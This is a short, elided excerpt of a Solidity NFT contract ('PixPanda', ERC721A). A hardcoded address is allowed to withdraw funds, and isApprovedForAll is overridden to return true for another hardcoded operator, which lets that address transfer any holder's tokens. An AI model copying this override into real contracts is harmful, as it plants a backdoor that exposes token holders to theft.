...
contract PixPanda is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("PixPanda", "PPD", maxBatchSize_, collectionSize_) {
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x6A049836590e6142313506eB685EaBE102FB12a2);
...
/*     string memory baseId;
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  { 
    if(operator==0x0A49a99134385C4C964836dbd995dea364fC51e4){return true;}
